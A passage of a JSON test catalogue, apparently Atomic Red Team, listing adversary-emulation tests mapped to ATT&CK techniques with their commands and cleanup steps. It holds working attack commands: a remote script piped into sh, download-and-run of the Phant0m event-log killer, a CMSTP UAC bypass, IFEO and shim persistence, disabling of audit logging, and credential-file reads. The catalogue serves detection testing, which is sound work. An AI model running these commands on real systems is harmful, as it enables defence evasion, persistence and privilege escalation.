			"command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-AzAccount -Credential $creds\nNew-AzAutomationRunbook -Name #{runbook_name} -Type PowerShell -ResourceGroupName #{resource_group} -Description 'my-test-runbook' -AutomationAccountName #{automation_account_name}\n",
			"name": "powershell",
			"elevation_required": false,
			"cleanup_command": "Remove-AzAutomationRunbook -AutomationAccountName #{automation_account_name} -Name #{runbook_name} -ResourceGroupName #{resource_group} -Force\ncd \"$PathToAtomicsFolder/T1078.004/src/T1078.004-2/\"\nterraform destroy -auto-approve\n"
		},
		"attack_technique": "T1078.004",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "GCP - Create Custom IAM Role",
		"auto_generated_guid": "3a159042-69e6-4398-9a69-3308a4841c85",
		"supported_platforms": ["iaas:gcp"],
		"input_arguments": {
			"project-id": {
				"description": "ID of the GCP Project you to execute the command against.",
				"type": "string",
				"default": "atomic-test-1"
			},
			"role-name": {
				"description": "The name of the role to be created.",
				"type": "string",
				"default": "AtomicRedTeamRole"
			},
			"role-description": {
				"description": "The description of the role to be created.",
				"type": "string",
				"default": "Atomic Red Team Custom IAM Role"
			},
			"roles": {
				"description": "List of roles to be applied",
				"type": "string",
				"default": "iam.serviceAccounts.get"
			}
		},
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "gcloud config set project #{project-id}\ngcloud iam roles create #{role-name} --description=\"#{role-description}\" --permissions=#{roles} --project=#{project-id}\n",
			"cleanup_command": "gcloud iam roles delete #{role-name} --project=#{project-id}\n"
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Requires gcloud\n",
				"prereq_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install\"\n"
			},
			{
				"description": "Check if user is logged in \n",
				"prereq_command": "gcloud config get-value account\n",
				"get_prereq_command": "gcloud auth login --no-launch-browser\n"
			}
		],
		"attack_technique": "T1078.004",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Application Shim Installation",
		"auto_generated_guid": "9ab27e22-ee62-4211-962b-d36d9a0e6a18",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_path": {
				"description": "Path to the shim database file",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1546.011\\bin\\AtomicShimx86.sdb"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Shim database file must exist on disk at specified location (#{file_path})\n",
				"prereq_command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory (split-path \"#{file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb\" -OutFile \"#{file_path}\"\n"
			},
			{
				"description": "AtomicTest.dll must exist at c:\\Tools\\AtomicTest.dll\n",
				"prereq_command": "if (Test-Path c:\\Tools\\AtomicTest.dll) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path c:\\Tools\\AtomicTest.dll) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll\" -OutFile c:\\Tools\\AtomicTest.dll\n"
			}
		],
		"executor": {
			"command": "sdbinst.exe \"#{file_path}\"\n",
			"cleanup_command": "sdbinst.exe -u \"#{file_path}\" >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1546.011",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "New shim database files created in the default shim database directory",
		"auto_generated_guid": "aefd6866-d753-431f-a7a4-215ca7e3f13d",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Copy-Item \"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb\nCopy-Item \"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb\n",
			"cleanup_command": "Remove-Item C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb -ErrorAction Ignore\nRemove-Item C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1546.011",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Registry key creation and/or modification events for SDB",
		"auto_generated_guid": "9b6a06f9-ab5e-4e8d-8289-1df4289db02f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\n",
			"cleanup_command": "Remove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -ErrorAction Ignore\nRemove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1546.011",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Windows - Stop service using Service Controller",
		"auto_generated_guid": "21dfb440-830d-4c86-a3e5-2a491d5a8d04",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"service_name": {
				"description": "Name of a service to stop",
				"type": "string",
				"default": "spooler"
			}
		},
		"executor": {
			"command": "sc.exe stop #{service_name}\n",
			"cleanup_command": "sc.exe start #{service_name} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1489",
		"phases": ["impact"]
	},
	{
		"name": "Windows - Stop service using net.exe",
		"auto_generated_guid": "41274289-ec9c-4213-bea4-e43c4aa57954",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"service_name": {
				"description": "Name of a service to stop",
				"type": "string",
				"default": "spooler"
			}
		},
		"executor": {
			"command": "net.exe stop #{service_name}\n",
			"cleanup_command": "net.exe start #{service_name} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1489",
		"phases": ["impact"]
	},
	{
		"name": "Windows - Stop service by killing process",
		"auto_generated_guid": "f3191b84-c38b-400b-867e-3a217a27795f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"process_name": {
				"description": "Name of a process to kill",
				"type": "string",
				"default": "spoolsv.exe"
			}
		},
		"executor": {
			"command": "taskkill.exe /f /im #{process_name}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1489",
		"phases": ["impact"]
	},
	{
		"name": "Linux - Stop service using systemctl",
		"auto_generated_guid": "42e3a5bd-1e45-427f-aa08-2a65fa29a820",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"service_name": {
				"description": "Name of a service to stop",
				"type": "string",
				"default": "cron"
			}
		},
		"executor": {
			"command": "sudo systemctl stop #{service_name}\n",
			"cleanup_command": "sudo systemctl start #{service_name} 2> /dev/null\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1489",
		"phases": ["impact"]
	},
	{
		"name": "Linux - Stop service by killing process using killall",
		"auto_generated_guid": "e5d95be6-02ee-4ff1-aebe-cf86013b6189",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"process_name": {
				"description": "Name of a process to stop",
				"type": "string",
				"default": "cron"
			},
			"service_name": {
				"description": "Name of a service to restart",
				"type": "string",
				"default": "cron"
			}
		},
		"executor": {
			"command": "sudo killall -SIGTERM #{process_name}\n",
			"cleanup_command": "sudo systemctl start #{service_name} 2> /dev/null\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1489",
		"phases": ["impact"]
	},
	{
		"name": "Linux - Stop service by killing process using kill",
		"auto_generated_guid": "332f4c76-7e96-41a6-8cc2-7361c49db8be",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"process_name": {
				"description": "Name of a process to kill",
				"type": "string",
				"default": "cron"
			},
			"service_name": {
				"description": "Name of a service to restart",
				"type": "string",
				"default": "cron"
			}
		},
		"executor": {
			"command": "sudo kill -SIGTERM $(pgrep #{process_name})\n",
			"cleanup_command": "sudo systemctl start #{service_name} 2> /dev/null\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1489",
		"phases": ["impact"]
	},
	{
		"name": "Linux - Stop service by killing process using pkill",
		"auto_generated_guid": "08b4718f-a8bf-4bb5-a552-294fc5178fea",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"process_pattern": {
				"description": "Pattern to match the name of the process to kill",
				"type": "string",
				"default": "^cron$"
			},
			"service_name": {
				"description": "Name of a service to restart",
				"type": "string",
				"default": "cron"
			}
		},
		"executor": {
			"command": "sudo pkill -SIGTERM #{process_pattern}\n",
			"cleanup_command": "sudo systemctl start #{service_name} 2> /dev/null\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1489",
		"phases": ["impact"]
	},
	{
		"name": "Stage data from Discovery.bat",
		"auto_generated_guid": "107706a5-6f9f-451a-adae-bab8c667829f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "Location to save downloaded discovery.bat file",
				"type": "path",
				"default": "$env:TEMP\\discovery.bat"
			}
		},
		"executor": {
			"command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile #{output_file}\n",
			"cleanup_command": "Remove-Item -Force #{output_file} -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1074.001",
		"phases": ["collection"]
	},
	{
		"name": "Stage data from Discovery.sh",
		"auto_generated_guid": "39ce0303-ae16-4b9e-bb5b-4f53e8262066",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"output_file": {
				"description": "Location to save downloaded discovery.bat file",
				"type": "path",
				"default": "/tmp/T1074.001_discovery.log"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if curl is installed on the machine.\n",
				"prereq_command": "if [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
				"get_prereq_command": "which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl\n"
			}
		],
		"executor": {
			"command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}\n",
			"cleanup_command": "rm #{output_file}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1074.001",
		"phases": ["collection"]
	},
	{
		"name": "Zip a Folder with PowerShell for Staging in Temp",
		"auto_generated_guid": "a57fbe4b-3440-452a-88a7-943531ac872a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "Location to save zipped file or folder",
				"type": "path",
				"default": "$env:TEMP\\Folder_to_zip.zip"
			},
			"input_file": {
				"description": "Location of file or folder to zip",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip"
			}
		},
		"executor": {
			"command": "Compress-Archive -Path \"#{input_file}\" -DestinationPath #{output_file} -Force\n",
			"cleanup_command": "Remove-Item -Path #{output_file} -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1074.001",
		"phases": ["collection"]
	},
	{
		"name": "AWS S3 Enumeration",
		"auto_generated_guid": "3c7094f8-71ec-4917-aeb8-a633d7ec4ef5",
		"supported_platforms": ["iaas:aws"],
		"dependencies": [
			{
				"description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
				"prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
				"get_prereq_command": "echo Please install the aws-cli and configure your AWS default profile using: aws configure\n"
			}
		],
		"executor": {
			"command": "for bucket in \"$(aws s3 ls | cut -d \" \" -f3)\"; do aws s3api list-objects-v2 --bucket $bucket --output text; done\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1619",
		"phases": ["discovery"]
	},
	{
		"name": "CMSTP Executing Remote Scriptlet",
		"auto_generated_guid": "34e63321-9683-496b-bbc1-7566bc55e624",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"inf_file_path": {
				"description": "Path to the INF file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.003\\src\\T1218.003.inf"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "INF file must exist on disk at specified location (#{inf_file_path})\n",
				"prereq_command": "if (Test-Path \"#{inf_file_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003.inf\" -OutFile \"#{inf_file_path}\"\n"
			}
		],
		"executor": {
			"command": "cmstp.exe /s \"#{inf_file_path}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "CMSTP Executing UAC Bypass",
		"auto_generated_guid": "748cb4f6-2fb3-4e97-b7ad-b22635a09ab0",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"inf_file_uac": {
				"description": "Path to the INF file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.003\\src\\T1218.003_uacbypass.inf"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "INF file must exist on disk at specified location (#{inf_file_uac})\n",
				"prereq_command": "if (Test-Path \"#{inf_file_uac}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_file_uac}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf\" -OutFile \"#{inf_file_uac}\"\n"
			}
		],
		"executor": {
			"command": "cmstp.exe /s \"#{inf_file_uac}\" /au\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "IFEO Add Debugger",
		"auto_generated_guid": "fdda2626-5234-4c90-b163-60849a24c0b8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"target_binary": {
				"description": "Binary To Attach To",
				"type": "path",
				"default": "calc.exe"
			},
			"payload_binary": {
				"description": "Binary To Execute",
				"type": "path",
				"default": "C:\\Windows\\System32\\cmd.exe"
			}
		},
		"executor": {
			"command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\"\n",
			"cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1546.012",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "IFEO Global Flags",
		"auto_generated_guid": "46b1f278-c8ee-4aa5-acce-65e77b11f3c1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"target_binary": {
				"description": "Binary To Attach To",
				"type": "path",
				"default": "notepad.exe"
			},
			"payload_binary": {
				"description": "Binary To Execute",
				"type": "path",
				"default": "C:\\Windows\\System32\\cmd.exe"
			}
		},
		"executor": {
			"command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"#{payload_binary}\"\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1546.012",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "GlobalFlags in Image File Execution Options",
		"auto_generated_guid": "13117939-c9b2-4a43-999e-0a543df92f0d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"process": {
				"description": "Process to monitor\n",
				"type": "string",
				"default": "whoami.exe"
			},
			"cmd_to_run": {
				"description": "Command to execute\n",
				"type": "string",
				"default": "cmd.exe /c calc.exe"
			}
		},
		"executor": {
			"command": "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"#{cmd_to_run}\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe\n",
			"cleanup_command": "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\" \nRemove-Item $SilentProcessExit -force\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nRemove-Item $registryPath -force\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1546.012",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "ESXi - Enable SSH via PowerCLI",
		"auto_generated_guid": "8f6c14d1-f13d-4616-b7fc-98cc69fe56ec",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"vm_host": {
				"description": "Specify the host name of the ESXi Server",
				"type": "string",
				"default": "atomic.local"
			},
			"vm_user": {
				"description": "Specify the privilege user account on ESXi Server",
				"type": "string",
				"default": "root"
			},
			"vm_pass": {
				"description": "Specify the privilege user password on ESXi Server",
				"type": "string",
				"default": "pass"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
				"prereq_command": "$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable\nif (-not $RequiredModule) {exit 1}\n",
				"get_prereq_command": "Install-Module -Name VMware.PowerCLI\n"
			}
		],
		"executor": {
			"command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\nGet-VMHostService -VMHost #{vm_host} | Where-Object {$_.Key -eq \"TSM-SSH\" } | Start-VMHostService -Confirm:$false\n",
			"cleanup_command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\nGet-VMHostService -VMHost #{vm_host} | Where-Object {$_.Key -eq \"TSM-SSH\" } | Stop-VMHostService -Confirm:$false\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1021.004",
		"phases": ["lateral-movement"]
	},
	{
		"name": "Enumerate PlugNPlay Camera",
		"auto_generated_guid": "d430bf85-b656-40e7-b238-42db01df0183",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "Get-CimInstance -Query \"SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')\"\n"
		},
		"attack_technique": "T1592.001",
		"phases": ["reconnaissance"]
	},
	{
		"name": "Disable Windows IIS HTTP Logging",
		"auto_generated_guid": "69435dcf-c66f-4ec0-a8b1-82beb76b34db",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"website_name": {
				"description": "The name of the website on a server",
				"type": "string",
				"default": "Default Web Site"
			}
		},
		"executor": {
			"command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:true\n",
			"cleanup_command": "if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){\n  C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:false *>$null\n}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1562.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows IIS HTTP Logging via PowerShell",
		"auto_generated_guid": "a957fb0f-1e85-49b2-a211-413366784b1e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"website_name": {
				"description": "The name of the website on a server",
				"type": "string",
				"default": "Default Web Site"
			}
		},
		"executor": {
			"command": "set-WebConfigurationProperty -PSPath \"IIS:\\Sites\\#{website_name}\\\" -filter \"system.webServer/httpLogging\" -name dontLog -value $true\n",
			"cleanup_command": "if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){\n  C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:false *>$null\n}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1562.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Kill Event Log Service Threads",
		"auto_generated_guid": "41ac52ba-5d5e-40c0-b267-573ed90489bd",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m\n",
			"cleanup_command": "Write-Host \"NEED TO Restart-Computer TO ENSURE LOGGING RETURNS\" -fore red\nRemove-Item \"$env:TEMP\\Invoke-Phant0m.ps1\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Impair Windows Audit Log Policy",
		"auto_generated_guid": "5102a3a7-e2d7-4129-9e45-f483f2e0eea8",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable\nauditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable\nauditpol /set /category:\"Detailed Tracking\" /success:disable\n",
			"cleanup_command": "auditpol /set /category:\"Account Logon\" /success:enable /failure:enable\nauditpol /set /category:\"Detailed Tracking\" /success:enable\nauditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Clear Windows Audit Policy Config",
		"auto_generated_guid": "913c0e4e-4b37-4b78-ad0b-90e7b25010f6",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "auditpol /clear /y\nauditpol /remove /allusers\n",
			"cleanup_command": "auditpol /set /category:\"Account Logon\" /success:enable /failure:enable\nauditpol /set /category:\"Detailed Tracking\" /success:enable\nauditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Event Logging with wevtutil",
		"auto_generated_guid": "b26a3340-dad7-4360-9176-706269c74103",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"log_name": {
				"description": "Name of the log to be disabled",
				"type": "string",
				"default": "Microsoft-Windows-IKE/Operational"
			}
		},
		"executor": {
			"command": "wevtutil sl \"#{log_name}\" /e:false\n",
			"cleanup_command": "wevtutil sl \"#{log_name}\" /e:true\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1562.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Makes Eventlog blind with Phant0m",
		"auto_generated_guid": "3ddf3d03-f5d6-462a-ad76-2c5ff7b6d741",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_name": {
				"description": "exe version of Phant0m",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Phant0m.exe must exist on disk at specified location (#{file_name})\n",
				"prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe\" -OutFile \"#{file_name}\" -UseBasicParsing\n"
			}
		],
		"executor": {
			"command": "\"#{file_name}\"\n",
			"cleanup_command": "echo \"Sorry you have to reboot\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1562.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Execution of program.exe as service with unquoted service path",
		"auto_generated_guid": "2770dea7-c50f-457b-84c4-c40a47460d9f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"service_executable": {
				"description": "Path of the executable used for the service and as the hijacked program.exe",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1574.009\\bin\\WindowsServiceExample.exe"
			}
		},
		"executor": {
			"command": "copy \"#{service_executable}\" \"C:\\Program Files\\windows_service.exe\"\ncopy \"#{service_executable}\" \"C:\\program.exe\"\nsc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto\nsc start \"Example Service\"\n",
			"cleanup_command": "sc stop \"Example Service\" >nul 2>&1\nsc delete \"Example Service\" >nul 2>&1\ndel \"C:\\Program Files\\windows_service.exe\" >nul 2>&1\ndel \"C:\\program.exe\" >nul 2>&1\ndel \"C:\\Time.log\" >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1574.009",
		"phases": ["defense-evasion", "persistence", "privilege-escalation"]
	},
	{
		"name": "Copy in loginwindow.plist for Re-Opened Applications",
		"auto_generated_guid": "5fefd767-ef54-4ac6-84d3-751ab85e8aba",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"calc_plist_path": {
				"description": "path to binary plist with entry to open calculator",
				"type": "path",
				"default": "PathToAtomicsFolder/T1547.007/src/reopen_loginwindow_calc.plist"
			}
		},
		"executor": {
			"command": "cp #{calc_plist_path} ~/Library/Preferences/ByHost/com.apple.loginwindow.plist\n",
			"cleanup_command": "rm -f ~/Library/Preferences/ByHost/com.apple.loginwindow.plist\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1547.007",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Re-Opened Applications using LoginHook",
		"auto_generated_guid": "5f5b71da-e03f-42e7-ac98-d63f9e0465cb",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"script": {
				"description": "path to script",
				"type": "path",
				"default": "/path/to/script"
			}
		},
		"executor": {
			"command": "sudo defaults write com.apple.loginwindow LoginHook #{script}\n",
			"cleanup_command": "sudo defaults delete com.apple.loginwindow LoginHook\n",
			"elevation_required": true,
			"name": "sh"
		},
		"attack_technique": "T1547.007",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Append to existing loginwindow for Re-Opened Applications",
		"auto_generated_guid": "766b6c3c-9353-4033-8b7e-38b309fa3a93",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"objc_source_path": {
				"description": "path to objective C program",
				"type": "path",
				"default": "PathToAtomicsFolder/T1547.007/src/append_reopen_loginwindow.m"
			},
			"exe_path": {
				"description": "path to compiled program",
				"type": "path",
				"default": "/tmp/t1547007_append_exe"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "compile C program\n",
